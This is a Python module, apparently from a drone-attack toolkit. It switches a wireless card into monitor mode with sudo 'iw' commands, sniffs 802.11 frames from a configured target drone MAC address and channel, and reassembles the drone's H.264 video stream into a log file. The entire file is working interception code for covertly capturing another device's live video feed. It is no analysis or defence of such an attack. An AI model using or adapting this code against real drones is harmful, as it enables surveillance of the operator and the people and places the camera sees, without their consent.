import os
import json
import time
import base64
import struct
from src.utils import sudo_exec
from scapy.all import sniff, Raw, Dot11

##################
### PREP MODULE ##
##################

class VideoSniffer:
    def __init__(self):

        # Get path to project root directory (two levels up from this file)
        target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
        scan_info = None

        # Intialize target drone data
        with open(target_data_file, 'r') as file:
            scan_info = json.load(file)

        target_info = scan_info.get("target_info", {})
        self.target_mac = target_info.get("mac_address")
        self.target_channel = target_info.get("channel")

        options_info = scan_info.get("options", {})
        self.timeout = options_info.get("packets", 60)
        self.interface = options_info.get("interface")

        # Output file for raw H.264 stream
        self.data_folder = os.path.join(os.path.dirname(__file__), '..', '..', "data")
        os.makedirs(self.data_folder, exist_ok=True)
        
        self.output_data_file = os.path.join(self.data_folder, "sniff_output.log")
        
        # Check if output file exists, get size if it does
        if os.path.exists(self.output_data_file):
            file_size = os.path.getsize(self.output_data_file)
            print(f"'sniff_output.log' exists with size: {file_size} bytes")
        else:
            with open(self.output_data_file, "w") as f:
                f.write("")
            print("'sniff_output.log' created.")
        
        # Append session separator
        with open(self.output_data_file, 'a') as f:
            f.write(f"\n=== VIDEO CAPTURE SESSION START: {time.time()} ===\n")

        # H.264 NAL unit start codes
        self.NAL_START_CODE = b'\x00\x00\x00\x01'
        
        # TELLO frame tracking
        self.last_frame_num = None
        self.frame_buffer = {}  # Buffer for reassembling fragmented frames
        self.cached_sps = None
        self.cached_pps = None
        self.packet_count = 0
        self.nal_count = 0
        
    def parse_tello_frame_header(self, payload):
        """
        Parses TELLO's custom video frame header.
        
        TELLO video packet format:
        - Bytes 0-1: Frame sequence number (little-endian)
        - Byte 2: Sub-sequence number (fragment index within frame)
        - Byte 3: Frame type flags
        
        Returns: (frame_seq, sub_seq, frame_type, header_size) or (None, None, None, None)
        """
        if len(payload) < 4:
            return None, None, None, None
        
        try:
            frame_seq = struct.unpack('<H', payload[0:2])[0]
            sub_seq = payload[2]
            frame_type = payload[3]
            header_size = 4
            
            return frame_seq, sub_seq, frame_type, header_size
        except Exception as e:
            print(f"Error parsing TELLO frame header: {e}")
            return None, None, None, None
    
    def get_nal_unit_type(self, nal_byte):
        """Extract NAL unit type from first byte (bits 0-4)."""
        return nal_byte & 0x1F
    
    def detect_packet_loss(self, frame_seq):
        """Detect and report frame loss based on sequence numbers."""
        if self.last_frame_num is not None:
            expected = (self.last_frame_num + 1) & 0xFFFF
            if frame_seq != expected:
                lost = (frame_seq - expected) & 0xFFFF
                if lost < 1000:  # Reasonable loss threshold
                    print(f"[LOSS] {lost} frames lost (expected {expected}, got {frame_seq})")
        self.last_frame_num = frame_seq
    
    def write_nal_unit(self, nal_data):
        """Write NAL unit to output log file with start code."""
        if not nal_data or len(nal_data) == 0:
            return
        
        try:
            nal_type = self.get_nal_unit_type(nal_data[0])
            
            # Cache SPS/PPS
            if nal_type == 7:  # SPS
                self.cached_sps = nal_data
                print(f"[NAL] Cached SPS ({len(nal_data)} bytes)")
            elif nal_type == 8:  # PPS
                self.cached_pps = nal_data
                print(f"[NAL] Cached PPS ({len(nal_data)} bytes)")
            
            # Build output with start codes
            output_data = b''
            
            # For IDR frames, prepend SPS/PPS if available
            if nal_type == 5:  # IDR frame
                if self.cached_sps:
                    output_data += self.NAL_START_CODE + self.cached_sps
                if self.cached_pps:
                    output_data += self.NAL_START_CODE + self.cached_pps
                print(f"[NAL] IDR frame ({len(nal_data)} bytes)")
            
            output_data += self.NAL_START_CODE + nal_data
            
            # Write raw H.264 data to log file (base64 encoded for text safety)
            b64_data = base64.b64encode(output_data).decode('utf-8')
            with open(self.output_data_file, 'a') as f:
                f.write(f"{b64_data}\n")
                f.flush()
            
            self.nal_count += 1
            
            if self.nal_count % 50 == 0:
                print(f"[INFO] Captured {self.packet_count} packets, {self.nal_count} NAL units")
            
        except Exception as e:
            print(f"Error writing NAL unit: {e}")

    def process_video_packet(self, payload):
        """Process a TELLO video packet and extract H.264 data."""
        frame_seq, sub_seq, frame_type, header_size = self.parse_tello_frame_header(payload)
        
        # All values are None together, so check any one
        if frame_seq is None or sub_seq is None or frame_type is None or header_size is None:
            return
        
        # Extract H.264 data after header
        h264_data = payload[header_size:]
        
        if len(h264_data) == 0:
            return
        
        # Detect frame loss on first fragment
        if sub_seq == 0:
            self.detect_packet_loss(frame_seq)
        
        # Handle fragmented frames
        if sub_seq == 0:
            # Start of new frame
            self.frame_buffer[frame_seq] = [h264_data]
        elif frame_seq in self.frame_buffer:
            # Continuation of existing frame
            self.frame_buffer[frame_seq].append(h264_data)
        
        # Check if frame is complete (frame_type indicates last fragment)
        is_last_fragment = (frame_type & 0x80) != 0
        
        if is_last_fragment and frame_seq in self.frame_buffer:
            # Reassemble complete frame
            complete_frame = b''.join(self.frame_buffer[frame_seq])
            del self.frame_buffer[frame_seq]
            
            # Write NAL unit
            self.write_nal_unit(complete_frame)
        
        # Clean up old buffered frames (prevent memory leak)
        old_frames = [seq for seq in self.frame_buffer.keys() 
                      if (frame_seq - seq) & 0xFFFF > 100]
        for seq in old_frames:
            del self.frame_buffer[seq]
        
    def packet_handler(self, packet):
        """Handle packets in monitor mode (802.11 frames)."""
        try:
            # Check for data frames with our target MAC
            if packet.haslayer(Dot11):
                dot11 = packet[Dot11]
                
                # Check if packet is from target drone (addr2 is source MAC)
                src_mac = dot11.addr2
                if src_mac and src_mac.lower() == self.target_mac.lower():
                    if packet.haslayer(Raw):
                        payload = packet[Raw].load
                        self.packet_count += 1
                        
                        # Process video packet
                        self.process_video_packet(payload)
                        
        except Exception as e:
            print(f"Error processing packet: {e}")

##################
## START MODULE ##
##################

Sniffer = VideoSniffer()

# Set interface to monitor mode and target channel
sudo_exec(f"ip link set {Sniffer.interface} down")
sudo_exec(f"iw {Sniffer.interface} set monitor none")
sudo_exec(f"ip link set {Sniffer.interface} up")
sudo_exec(f"iw {Sniffer.interface} set channel {Sniffer.target_channel}")

print(f"\n[MONITOR MODE] Sniffing for TELLO video from {Sniffer.target_mac} on channel {Sniffer.target_channel}")
print(f"Output: {Sniffer.output_data_file}\n")

try:
    sniff(
        iface=Sniffer.interface,
        prn=Sniffer.packet_handler,
        timeout=Sniffer.timeout,
        store=0  # Causes RAM issues if you store
    )
    print(f"\n[DONE] Captured {Sniffer.packet_count} packets, {Sniffer.nal_count} NAL units")
    print(f"Output saved to: {Sniffer.output_data_file}")
except KeyboardInterrupt:
    print(f"\n[STOPPED] Captured {Sniffer.packet_count} packets, {Sniffer.nal_count} NAL units")
except Exception as e:
    print(f"Sniffer crashed: {e}")

